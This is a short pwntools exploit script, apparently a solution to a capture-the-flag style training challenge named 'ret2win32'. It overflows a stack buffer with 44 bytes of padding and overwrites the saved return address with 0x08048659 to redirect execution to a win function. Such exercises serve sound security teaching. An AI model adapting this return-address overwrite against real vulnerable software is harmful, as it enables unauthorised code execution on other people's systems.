from pwn import *

p = process('./ret2win32')
eip_off = 44
ret2win = p32(0x08048659)
payload = "A"*eip_off + ret2win

p.sendline(payload)
p.interactive()
